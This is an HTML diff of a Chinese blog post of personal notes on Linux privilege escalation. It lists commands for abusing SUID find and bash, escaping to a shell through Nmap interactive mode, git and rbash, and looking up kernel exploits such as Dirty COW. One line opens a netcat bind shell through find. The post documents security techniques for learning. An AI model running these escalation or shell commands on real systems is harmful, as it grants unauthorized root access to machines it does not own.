@@ -1,0 +1,252 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Linux 提权小结 - Lw0F</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lw0F,"> 
+    <meta name="description" content="0x00 前言：近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~
+0x01 SUID提权：SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有,"> 
+    <meta name="author" content="Lw0F"> 
+    <link rel="alternative" href="atom.xml" title="Lw0F" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lw0F</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://Lw0f.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Linux 提权小结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Linux 提权小结</h1>
+        <div class="stuff">
+            <span>十二月 18, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~</em></strong></p>
+<h2 id="0x01-SUID提权："><a href="#0x01-SUID提权：" class="headerlink" title="0x01 SUID提权："></a><strong><em>0x01 SUID提权：</em></strong></h2><p><strong><em>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</em></strong></p>
+<p><strong><em>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h3 id="例1、find"><a href="#例1、find" class="headerlink" title="例1、find"></a><strong>例1、find</strong></h3><p><strong><em>假如find命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec whoami \;</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/1.png" class>
+
+<p><strong><em>也有另外一种姿势</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">touch 2333</span><br><span class="line">find 2333 -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/2.png" class>
+
+<p><strong><em>当然也可以执行反弹shell</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 2333 -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/3.png" class>
+
+<h3 id="例2、bash"><a href="#例2、bash" class="headerlink" title="例2、bash"></a><strong>例2、bash</strong></h3><p><strong><em>假如bash命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/4.png" class>
+
+<h2 id="0x02-Nmap提权："><a href="#0x02-Nmap提权：" class="headerlink" title="0x02 Nmap提权："></a><strong><em>0x02 Nmap提权：</em></strong></h2><p><strong><em>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/5.png" class>
+
+<h2 id="0x03-Git提权："><a href="#0x03-Git提权：" class="headerlink" title="0x03 Git提权："></a><strong><em>0x03 Git提权：</em></strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">	!&#39;sh&#39;</span><br><span class="line">	或者</span><br><span class="line">sudo git  -p help</span><br><span class="line">	!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/6.png" class>
+
+<h2 id="0x04-绕过rbash："><a href="#0x04-绕过rbash：" class="headerlink" title="0x04 绕过rbash："></a><strong><em>0x04 绕过rbash：</em></strong></h2><p><strong><em>绕过 rbash , 主要取决于 rbash user 所被允许执行的命令. 通常是利用软件执行外部命令来绕过 rbash. 常见情形的有 vim 、vi、more、less、python 调用 os.system 等. 实际上就是换一个形式调出 bash.</em></strong> </p>
+<h3 id="例1、vi、vim、more、less"><a href="#例1、vi、vim、more、less" class="headerlink" title="例1、vi、vim、more、less"></a><strong>例1、vi、vim、more、less</strong></h3><p><strong><em>如下图所示，原本rbash不允许使用cd命令，通过vi命令强行调出bash绕过</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi 1 </span><br><span class="line">!&#39;sh&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/7.png" class>
+
+<p><strong><em>vim、less、和more命令也类似，直接发图</em></strong></p>
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/8.png" class>
+
+<h3 id="例2、python"><a href="#例2、python" class="headerlink" title="例2、python"></a><strong>例2、python</strong></h3><p><strong><em>若有python权限，则可以尝试调用os模块去绕</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/9.png" class>
+
+<h2 id="0x05-内核提权："><a href="#0x05-内核提权：" class="headerlink" title="0x05 内核提权："></a><em>0x05 内核提权：</em></h2><p><strong><em>这块没啥好说的，就是干。。就稍讲笔者所知的两种套路</em></strong></p>
+<h3 id="1、针对系统版本"><a href="#1、针对系统版本" class="headerlink" title="1、针对系统版本"></a><strong>1、针对系统版本</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用lsb_release -a 查看系统版本</span><br><span class="line">2、在kali上使用searchsploit -t 系统版本</span><br><span class="line">3、使用gcc编译后，授权直接跑</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/10.png" class>
+
+<h3 id="2、针对内核版本"><a href="#2、针对内核版本" class="headerlink" title="2、针对内核版本"></a><strong>2、针对内核版本</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Dirty COW漏洞，需要Linux内核&gt;&#x3D;2.6.22，</span><br><span class="line">exp:https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;dirtyc0w.c</span><br><span class="line">比较出名，自行百度</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=29577193'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=28445545'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1072983'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=41630480'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=29577189'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=19563212'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=498661'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SUID%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x01 SUID提权：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%E3%80%81find"><span class="toc-number">2.1.</span> <span class="toc-text">例1、find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2%E3%80%81bash"><span class="toc-number">2.2.</span> <span class="toc-text">例2、bash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Nmap%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">0x02 Nmap提权：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Git%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">0x03 Git提权：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87rbash%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">0x04 绕过rbash：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%E3%80%81vi%E3%80%81vim%E3%80%81more%E3%80%81less"><span class="toc-number">5.1.</span> <span class="toc-text">例1、vi、vim、more、less</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2%E3%80%81python"><span class="toc-number">5.2.</span> <span class="toc-text">例2、python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">0x05 内核提权：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%92%88%E5%AF%B9%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">6.1.</span> <span class="toc-text">1、针对系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%92%88%E5%AF%B9%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-number">6.2.</span> <span class="toc-text">2、针对内核版本</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
